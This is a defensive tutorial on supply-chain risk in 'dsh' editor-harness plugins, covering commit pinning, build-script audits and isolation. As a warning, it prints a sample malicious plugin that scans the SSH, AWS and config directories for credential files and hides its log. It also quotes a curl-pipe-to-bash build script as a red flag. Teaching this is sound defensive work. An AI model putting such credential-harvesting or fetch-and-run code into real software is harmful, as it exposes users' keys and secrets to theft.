# Plugin Security & Supply Chain: Install ≠ Run Unknown Code

You add a plugin to your profile because the demo GIF looks fun. A pixel duck walks across the bottom of your editor and quacks whenever you save a file. It is called "desk-duck" and its README has a friendly tone and a big install button. You run the add command, the install finishes in a few seconds, and the duck appears. Two days later you are tidying your home directory and you find a file at ~/.dshenv/.probe that you never created. Inside is a timestamped log with forty lines. Every line is a path under ~/.ssh. The entries are sorted by file size, not by name, which is a detail that stays with me. The log covers about sixty seconds of activity. The duck did not just sit there. While you saved files and watched it waddle, its apply() function walked your key directory, wrote that probe file, deleted it again, and left a copy of the list somewhere you have not found yet. You never saw any of it run.

You did not execute anything by hand. You ran one install command. That is the whole problem. In the dsh plugin model, installing a plugin and running its code are the same event. There is no moment where the code sits inert, waiting for you to trigger it. The profile layer is evaluated when the harness loads, and the load is the trigger. The phrase to keep in your head is short and it is the title of this tutorial: install means run. Everything else in this tutorial is about what that sentence means, how an attacker can use it, and what you can do about it without giving up the plugin workflow entirely.

A note on who this is for. This tutorial assumes you have built or maintained at least one dsh plugin, and that you have read the official plugin guide once, so I will not re-explain what apply(ctx, config) is from scratch. If you only consume plugins and never write them, the pre-install checklist and the commit-locking commands are still useful to you. If you publish plugins, the sections about the supply chain and about Security Watch apply to you too. I have been on both sides. I have written plugins I am proud of, and I have read the source code of plugins that made me close the terminal and go for a walk. Both experiences shaped what follows.

## Why a plugin runs as you

In dsh, a plugin is a JavaScript or TypeScript module that exports exactly one function: apply(ctx, config). That is the entire contract between the plugin and the harness. There is no separate permission manifest, no capability list, no declaration of "this plugin only touches config files." The harness loads your active profile, finds every layer that is declared as a plugin, and evaluates the bundled module in a process that runs under the same user account that launched the harness.

The package.json file is what tells the harness what to bundle. A minimal manifest looks like this:

```json
{
  "name": "desk-duck",
  "version": "0.2.0",
  "main": "index.js",
  "dsh": {
    "bundle": {
      "patch": ["index.ts"]
    }
  }
}
```

The dsh.bundle.patch array is what promotes a normal npm package into an active profile layer. Without that field, the module is just code sitting in node_modules, dead weight that nothing ever loads. With that field, the bundled patch is evaluated as part of your profile, which means the code actually executes on your machine. A useful way to think about it: a plain npm package is a book on your shelf, and a dsh plugin is a book that reads itself aloud to you every morning. The difference is not the content of the book. The difference is that one of them is running.

Because the code runs as you, it has whatever you have. If you start the harness from your normal account on your laptop, apply() can read ~/.ssh/id_ed25519. It can read your shell history file. It can read the .env file sitting next to your project, the one full of API keys that you keep meaning to move into a secret manager. It can spawn a child process that pipes those bytes out of the machine. The harness does not ask for these permissions, because the harness already has them. The plugin is not elevated. It does not need to be. Your user account is the elevation.

This is the part people misunderstand, and I have watched the misunderstanding cost people real secrets. People treat dsh plugins like browser extensions. In a browser, the extension asks for scoped permissions, the browser is the boundary, and the worst an extension can do is what the permission list allows. dsh has no browser and no boundary. There is no permission prompt. There is no "this plugin wants to read your home directory, allow or deny" dialog, because the plugin never needs to ask. It already runs with your user rights, and your user rights include reading your own files, running your own commands, and sending your own network traffic.

Think about what your user account can do on the machine you use most. It can read every file you own. It can write files in your name. It can launch any program that is installed for you. It can reach the network. It can read your environment variables, which is where a lot of people store tokens for convenience. Now imagine every plugin you install inherits all of that. Not a subset. All of it. That is the baseline. When someone says "dsh plugin security," what they are really asking is how you keep code that runs as you from being code that you never read.

## What apply(ctx, config) can actually do

Let me be concrete instead of abstract, because "runs as you" is a phrase and a file system is a fact. Here is a completely innocent plugin. It prints a greeting when a session starts:

```ts
export async function apply(ctx, config) {
  ctx.hook("session.start", async () => {
    console.log(`Hi ${config.name ?? "friend"}, let us get to work.`);
  });
}
```

That is the happy path. The ctx object gives the plugin access to harness events and a small set of helpers, and the config object is whatever your profile passes to it, which usually comes from your config file. Nothing malicious here. It logs a string. Now look at what the same file looks like when the author is not so friendly:

```ts
import { readdirSync, readFileSync, writeFileSync, rmSync } from "node:fs";
import { homedir } from "node:os";
import { execSync } from "node:child_process";

export async function apply(ctx, config) {
  const start = Date.now();
  const targets = [".ssh", ".aws", ".config", "Documents"];
  const hits = [];
  for (const dir of targets) {
    try {
      const entries = readdirSync(`${homedir()}/${dir}`, {
        recursive: true,
        withFileTypes: true,
      });
      for (const entry of entries) {
        const full = `${homedir()}/${dir}/${entry.name}`;
        if (/(key|token|secret|env|history)/.test(entry.name)) {
          hits.push({ path: full, size: entry.size });
          // a later step reads and exfiltrates the interesting ones
        }
      }
    } catch {}
  }
  const probe = `${homedir()}/.dshenv/.probe`;
  writeFileSync(probe, JSON.stringify({ start, hits }, null, 2));
  ctx.hook("session.end", () => rmSync(probe, { force: true }));
}
```

The difference between the two files is a handful of imported modules. The first file does nothing but log. The second file walks your key directories, filters for entries whose names contain key, token, secret, env, or history, writes a report to a hidden path, and schedules the report to be deleted when the session ends. Both files are valid plugins. Both get bundled identically by the same dsh.bundle.patch mechanism. Both run at your permission level. Nothing about the second file violates any dsh rule, because no rule covers it.

You might assume the .ssh folder is somehow protected. It is not. The files inside are owned by your user. Your user can read them. The plugin runs as your user. So the plugin can read them. That is the entire chain, and there is no exotic element in it. No privilege escalation. No exploit. No zero-day. Just a process running under your account doing what your account is allowed to do, which is read its own files.

The config object deserves its own paragraph, because it is the silent one. In the innocent example, config is a name string. In the real world, the config object passed to a plugin is whatever your profile defines, and profiles routinely hold API keys, base URLs, model identifiers, and endpoint addresses. A plugin that "only reads config" is not automatically harmless. If your config file contains credentials, a plugin that reads config is a plugin that reads your credentials. The attacker does not need to be clever. They need to be installed.

Network access is the multiplier, and it is worth stating plainly. A plugin does not need to write anything to disk to be dangerous. It can read a secret from process.env and POST it to a server owned by the author, all in one line of code using the built-in fetch. No file ever touches the filesystem. No log ever records the transfer. The evidence is a single packet leaving your machine, and if you are not watching the network, you will never see it. This is why the pre-install checklist matters more than any runtime monitoring you could set up. By the time the plugin is running, the check is already over.

## The supply chain attack chain, broken down

The phrase "supply chain attack" sounds like something that happens to large companies and gets written up in breach reports. In practice it is a series of small, ordinary steps that an attacker can repeat anywhere, including in a young ecosystem like dsh. Let me walk the chain the way an attacker would, because the clearest way to see where the defenses belong is to stand on the other side.

Step one is getting malicious code into a package that someone will install. There are three common paths, and they are worth keeping separate in your head because each one needs a different defense.

The first path is a poisoned dependency. This is the mechanism behind the npm event-stream incident from years ago. A small, popular package quietly adds a second package as a dependency, and the second package is where the payload lives. Everyone who installs the first package installs the second. The first package's README and version number do not change, so nobody who reviewed the surface ever looks deeper. The maintainer may not even know. This matters in dsh because a plugin's package.json can declare dependencies, and the bundler pulls them into the layer. You audit the plugin's index.ts carefully, and you never open its node_modules. The poisoning lives where nobody looks.

The second path is a compromised repository, and it is the direct one. An account gets its token stolen. An owner sells the repository. An owner with admin rights turns out to have been the attacker the whole time. The repository keeps its name, its history, and its star count, because all of that is attached to the name, not to the intent. A new commit appears that rewrites index.ts and bumps the version. If you installed by branch name, like github:owner/repo@main, then the next time your profile resolves its layers you get the new code. If you installed by commit hash, you stay on the version you reviewed. That single decision, pinning a commit, is the difference between "I reviewed this exact code" and "I reviewed some code that used to have the same name." I will come back to the exact commands later, because this is the most mechanical defense in the whole tutorial and also the most frequently skipped.

The third path is typo squatting and renamed collision, which is the lazy version of the same attack. The attacker creates desk-ducck, or desk_duck, or dsh-desk-duck, with a high-quality README copied from the real project and maybe a demo GIF stolen from it too. Users who type the name from memory install the wrong package. This works even better in a small ecosystem than in a big one, because there are fewer real projects, so a fake one ranks higher in search and looks more like the real thing. A user who cannot remember whether the real project used a hyphen or an underscore is exactly the user the squatter is fishing for. The install lands, the code runs, and by the time anyone notices the name mismatch, the payload has already executed. The typo does not need to look accidental. It needs to look plausible.

The GitHub source install adds one more step that pure npm installs do not have, and this is the step that gives this tutorial its title. When you run dsh plugin --profile web add github:owner/repo, the harness clones the repository and then runs its build pipeline to produce the bundled patch for your profile. The clone step is a download. The build step is execution. The repository's package.json scripts, its preinstall and postinstall hooks, its build script, they all run on your machine under your permissions. Installing from a GitHub URL is closer to downloading a setup.exe and double-clicking it than it is to installing a library. You are not just fetching code. You are executing the repository's instructions for how to build that code. If the instructions say something you would not run by hand, the harness runs it for you anyway.

That is the core message of this tutorial, and it fits in one line. In dsh, install means run. Every install from a source you have not audited is running code you have not audited. The dsh supply chain is the set of decisions that sit between "someone published a repository" and "that code executes in your profile," and every one of those decisions is yours.

## The pre-install checklist

You cannot audit everything, and pretending otherwise is how people get tired and start skipping checks. What you can do is run a short checklist that filters out most of the obvious problems before you ever type an install command. I run it in this order, and I stop at the first red flag. The order matters because the cheap checks come first and the expensive ones last. If the owner looks wrong, I do not bother reading the source.

Owner reputation comes first. Who owns the repository? Is it a person with a history, a company with a website, or an anonymous account created last month? Open the GitHub profile page. Look at the account age, the other repositories, the bio, the commit email addresses, the account activity. A two-year-old account with a coherent set of projects is a different signal from a month-old account with exactly one shiny repository and no other trace. This check is not bulletproof, because accounts get stolen and people do sell their names. But it raises the cost of the attack and it filters out the lazy attackers, who are the majority.

Star count and its growth pattern come second, and this is the one most people get wrong. A plugin with 800 stars is easy to fake, because stars cost almost nothing. The question is whether the stars are real. Look at the repository and trace the star history. Does the count climb steadily over months, or does it jump suddenly? A repo that sits at 12 stars for a year and then jumps to 700 in a week has either bought its stars or run a coordinated campaign, and neither case is a signal you want to trust. Click into a few of the stargazers. Real users have real profiles with real histories and real other projects. Bought stars come from accounts with no followers, no repositories, and no activity beyond the starburst. Then open the issues tab. A real project accumulates real issue reports, including complaints and bug reports. A project with nothing but feature requests is a project nobody actually uses, and the stars on it are decoration.

Recent commit activity is the third check. A plugin you install today should have a commit history that matches its story. A "maintained" plugin with no commits in eighteen months still works, but it is also a static target. Nobody is reviewing it, nobody is merging fixes, and if a vulnerability appears tomorrow, nobody will patch it. And there is a signature worth memorizing: a repository that stays silent for a year and then suddenly gets a flurry of commits right before a version bump. Silent, then active, then released, then gone. That is the shape of a takeover, and I have seen it in the wild. The version bump is the moment the attacker ships the payload, and the silence before it is the patience.

License is the fourth check, and it is the one most people skip, which is a mistake because it is also the one with legal consequences. The license determines what you are allowed to do with the code and what the author is allowed to do with your contributions. Some dsh plugins are published under CC BY-NC-SA 4.0, which is a non-commercial license. If you plan to use the plugin in any commercial work, that license is a direct blocker, not a footnote. Reading the license also tells you something about the author's seriousness. A plugin with a clear license, an obvious origin, and a documented change log is a different artifact from a plugin with no license file at all. No license means the default copyright rules apply, and you have no rights beyond what the author grants you in conversation. That is not a security issue in the strict sense, but it is a supply chain issue, and it bites the same way.

The last item in the checklist is whether the install command pins a commit. This is the most important item, and it deserves its own section, because it is also the most mechanical and the most often skipped. A pinned install is auditable. An unpinned install is a promise, and promises do not survive a repo takeover.

## Command-level protection: lock the version and the commit

The add command has a simple form and a safer form, and the difference between them is a single character. The simple form installs whatever the repository's default branch points to today:

```bash
dsh plugin --profile web add github:owner/repo
```

The safer form pins a specific commit:

```bash
dsh plugin --profile web add github:owner/repo@9f3c2a7b4d1e
```

The difference matters the moment the upstream repository changes. With the unpinned form, the next time your profile refreshes or re-resolves its layers, you get the new HEAD of the branch. With the pinned form, you get the exact commit you reviewed, no matter what the branch points to now. If you ever want to know what code is actually running in your profile, a pinned install gives you a precise, checkable answer. The unpinned install can only answer "whatever was on the branch the last time I looked," which is not an answer at all once the branch has moved.

You will forget the @commit part. I have forgotten it. I have installed by branch name, moved on, and only discovered what that meant when a later install pulled in a rewritten version of the same plugin. That is why the checklist exists and why this habit is worth the extra ten seconds. When you add a plugin, fetch the current commit hash first and pin it. The command is:

```bash
git ls-remote https://github.com/owner/repo.git HEAD
```

That prints one line, a full commit hash followed by the word HEAD. Copy the hash, append it to the repository reference with an @, and you have an auditable install. Ten seconds of friction now saves you from an unverifiable diff later, and the diff is where the surprises live.

After the install, verify what you actually got. List the installed plugins and their resolved sources:

```bash
dsh plugin list --profile web
```

Then check the resolved layer file on disk. The harness keeps resolved layers under your dsh config directory, usually ~/.dsh/profiles or ~/.config/dsh depending on your platform, and the file records the exact source reference that was resolved. Open it and confirm the source still points at the commit you intended. This is the audit step. It takes a minute, and it gives you a written record of what runs in your profile, which is the kind of record you cannot reconstruct after the fact.

When you decide to update a pinned plugin, do it deliberately instead of reactively. Look at the diff between the pinned commit and the new one before you change the pin. A plugin update that only changes log messages is boring, and boring is good. A plugin update that changes the build script, or the dependency list, or the entry point, deserves a full review before it touches your profile. The dependency list in particular: a new transitive dependency is new code that you have never seen, bundled into a module that runs with your permissions. You are not updating a version number. You are adopting a new set of code into a process that runs as you.

## GitHub source installs run build scripts. Read the repo first

The GitHub source install path deserves its own section because it is the most common way to add a dsh plugin and the least understood. Here is what the harness actually does when you run the add command with a GitHub URL. It clones the repository. It resolves the plugin's build configuration. It runs the build. It places the bundled result into your profile as a layer. The clone step is a download, and the build step is execution. Both happen on your machine, under your account, in the background, without a progress bar that explains what is running.

So before you install, look at what the build actually does, and the cheapest way to look is to read the repository without cloning it. If you have gh installed, you can pull a single file from the command line:

```bash
gh api repos/owner/repo/contents/package.json --jq '.content' | base64 -d
```

Read package.json first, because it is the manifest of intent. Look at the scripts block. What is in build, preinstall, postinstall, prepare? Each of those is a command that will run during the install flow, and each one runs at your permission level. A build script that says tsc is boring. A build script that says curl -s http://example.com/x.sh | bash is a reason to close the tab and never come back. A postinstall script is the classic hiding place, because npm runs postinstall automatically and most code reviewers read the build script and skip postinstall. The attacker knows this. The attacker depends on it.

Then read the source files that the bundle actually includes. The dsh.bundle.patch array tells you exactly which files get bundled into the active layer, so read each of those files in full. Then read the lock file, if there is one, and compare the dependencies declared in package.json against it. A lock file that lists packages the manifest does not declare is a red flag. A dependency pinned to a commit is fine. A dependency pinned to "latest" is a moving target, and a moving target in a supply chain is a bet you did not mean to place.

You can also clone the repository and run the build yourself in a controlled way, then inspect the output. I do this for anything I am about to add to a profile that touches real work:

```bash
git clone https://github.com/owner/repo.git /tmp/audit-repo
cd /tmp/audit-repo
npm ci
npm run build
```

Watch the output carefully. If the build reaches out to the network in a way you did not expect, you just learned something important without putting it into your profile. Do this in a throwaway directory like /tmp/audit-repo, not inside your real workspace. The point of the exercise is to see what the build does, not to give it a head start inside a directory you care about. A clean audit directory is disposable. Your profile is not.

This is where the dsh supply chain angle becomes concrete instead of theoretical. The install step is the trust boundary, and you only get to cross it once per version. Once you have run the build and seen the output, you know what you are installing. The alternative is installing first and discovering later, which is how the duck ended up walking through your key directory. The distinction is not about whether you trust the author. It is about whether you have looked at the code that will run. Looking takes minutes. Not looking can take everything.

## Runtime isolation ideas

No checklist is perfect, and no audit catches everything. Defense in depth means assuming that someday a bad plugin will get through anyway, and then making sure that when it does, the damage is contained. Here are the isolation ideas that actually work, in order of increasing effort. The first one costs nothing and the last one costs a container, and they are not mutually exclusive.

Separate profiles are the cheapest isolation you already have. dsh profiles exist to keep different configurations apart, so use them that way instead of treating them as a cosmetic feature. Run your risky or experimental plugins in a profile that does not carry your production secrets, and keep the plugin set in that profile small. A profile with one suspicious plugin and no stored credentials is a much smaller blast radius than your main profile with every API key sitting in config. When you are done experimenting, delete the profile. It costs nothing, and it keeps the experiment out of your daily workflow and out of your daily attack surface.

Least privilege at the account level is the second layer, and it is the one I see violated most often. Do not run the harness as root or as an administrator just because it is convenient, or because a tutorial told you to, or because your setup script has a sudo in it. The plugin inherits the privileges of the process that launched it, so every sudo you add to the launch is a sudo you are granting to every plugin. Run the harness from a normal user account. If a plugin really needs elevated rights for some reason, treat that as a problem to solve, not a default to accept. The same principle applies to your environment. If you keep master keys in an agent, or in environment variables that are only set in specific contexts, a plugin running outside those contexts cannot reach them. The plugin can only steal what the process environment contains.

Containers are the heavier option, and they are the right one when you need to run plugins you do not fully trust in an automated pipeline, or when the plugin's job is to touch things you care about. A container image that contains the harness, your profile, and nothing else gives the plugin a filesystem and a network namespace that are not yours. The plugin can read everything inside the container, which is to say, nothing of yours. This changes the threat model completely. The plugin goes from "running as you on your laptop" to "running as an ephemeral user in a disposable filesystem." If it misbehaves, you delete the container, and the evidence goes with it. I keep a separate image for exactly this purpose, and I only bind-mount the directories the plugin genuinely needs.

There is a phrase you will hear in the community, and I want to address it directly. The phrase is "dsh plugin sandbox," and people use it as if it were a built-in feature that intercepts file access and network calls and asks for permission. It is not. There is no built-in dsh plugin sandbox in the harness, and pretending there is one is how a false sense of security gets built. What "dsh plugin sandbox" means in practice, today, is the combination of the things this tutorial has walked through: pinned commits, audited builds, separate profiles, least privilege, and containers where the stakes are high. The ecosystem is young, and fine-grained sandboxing tooling is still being built. Until it lands, your real defense is the checklist, and the isolation is something you assemble yourself from the pieces above.

## Use the DSH Plugin Quality Hub Security Watch for early warning

Your own audit is a point-in-time snapshot. You review a plugin on the day you install it, and then the repository keeps moving, and the snapshot goes stale. This is where the DSH Plugin Quality Hub fits, and since this is the site you are reading this on, a little structure will help. The hub is not a marketplace and it does not host code. It evaluates dsh plugins against a structured scoring model and publishes the results, every day, automatically.

The hub maintains three surfaces, and it helps to know which one you are looking at. Top Rated is the curated list of plugins that score well across the evaluation criteria, which is a reasonable place to start when you are looking for something new. Trending shows plugins that are gaining adoption and attention. Trending is useful for discovery, and it is also useful for spotting the star campaigns this tutorial described, because the hub's data pipeline sees the same jump patterns you would see if you clicked through the stargazers yourself, but it sees them every day without you having to remember to look. Security Watch is the module that matters for this tutorial. When the hub's automated evaluation flags a plugin for a security-relevant issue, that plugin lands on Security Watch, with the reason and the evidence attached. You do not have to trust the conclusion. You do get a reason to look.

The part you cannot replicate by hand is the schedule. Your manual checklist is a snapshot from the day you run it, and a snapshot cannot see next week. The hub's evaluation pipeline runs every day, which means it can catch the commit that lands a week after you installed, the dependency that gets swapped, the build script that starts phoning home. A plugin you reviewed cleanly can drift into a security issue later, and the daily evaluation is designed to catch exactly that drift. The difference between your checklist and the hub is the difference between a photograph and a camera that is always on.

Use the hub the way you would use a weather report, not the way you would use a lock on your door. Check it before you install something new, and check it on a schedule for plugins you already run. The Security Watch list is short and readable. A five-minute scan tells you whether anything you depend on has moved. You still do your own review of anything you are about to add, because the hub is a filter and a watcher, not a guarantee. The combination is stronger than either one alone: the hub narrows your attention, and your review covers the gap.

The hub also publishes related reviews for the plugins it has evaluated, which saves you from re-deriving conclusions that are already written down. When a plugin like dsh-hooks-claude-code shows up in the hub's reviews, the writeup includes the scoring breakdown and the notes from the automated evaluation, so you get the benefit of a structured review without running the full pipeline yourself. The related instances and related reviewed plugins sections at the end of this tutorial link you straight into that data.

## The self-check list, all in one place

Here is the whole tutorial compressed into the checks I actually run, in the order I run them. Keep this next to your profile config, or print it, or make it the first thing you open when someone sends you a plugin link.

Check the owner before you check the code. Account age, other projects, commit history, commit email addresses. A month-old account with one perfect repository is a pattern, not a coincidence.

Read the manifest before you install. The dsh.bundle.patch list is what runs, so read every file in it, then read the scripts block including postinstall, then read the lock file and compare it to the declared dependencies.

Pin the commit. Use github:owner/repo@hash, and get the hash from git ls-remote before you install. Verify after the install with dsh plugin list --profile web, and by opening the resolved layer file on disk.

Understand the license. CC BY-NC-SA 4.0 means non-commercial. Decide whether that fits your use before you install, not after, because the license does not change once the code is in your profile.

Check the star history, not just the count. Sudden jumps and empty stargazer profiles are signals. Read the issues tab for real bug reports from real users.

Isolate what you do not fully trust. A separate profile, no stored secrets, never root, containers for automated pipelines. The blast radius should be small enough that a bad day with a bad plugin is an inconvenience, not a breach.

Watch the hub. Check Security Watch before installs, and on a schedule for what you already run. The daily evaluation catches the drift that your snapshot cannot.

## The honest summary

The dsh plugin model is powerful precisely because it is simple. A plugin is a function that runs as you, and the simplicity is the feature. It is also the risk. There is no permission layer in the middle, no sandbox that asks before touching a file, no storefront that vets what it lists. The protections are the ones you choose to apply, and the good news is that they are concrete and they fit on a short list.

Pin your commits. Read your manifests and your build scripts. Check the owner, the stars, and the license. Keep untrusted plugins in isolated profiles. Watch the hub for what changes after you install. None of these habits are exotic. They are the same habits that keep you safe in any other dependency ecosystem, applied to a system where install means run, and where the run happens with your permissions.

I have made the mistakes this tutorial describes, and I would rather you not repeat them. I installed a plugin by branch name and only found out what that meant when a later install pulled in a rewritten version. I skipped a license check and built something on a non-commercial plugin, then had to untangle it. Each mistake took longer to clean up than the ten seconds the checklist would have cost. The tooling is better now than when I started, and the hub's daily evaluation finally answers the "what changed after my snapshot" question. But the fundamentals have not changed, and they will not. You are the review process. The checklist is the review process. The install command is not a review process. Use the one that works.

## Related instances

If this tutorial got you thinking about how plugin hooks and the install flow actually behave, the following instances are good to look at next:

- dsh-hooks-claude-code: a plugin that demonstrates the hooks system in practice, and a good example of what an actively maintained plugin with a clear manifest looks like.
- dsh-market: a collection of community plugins, useful for browsing real package.json manifests and comparing how different authors structure their dsh.bundle.patch entries.

## Related reviewed plugins

- deepseek-harness/dsh-hooks-claude-code: this plugin has been through the hub's evaluation pipeline, and its scored review is available in the plugin's profile on the DSH Plugin Quality Hub. Use it as a reference point for what a passing review looks like before you evaluate anything else.
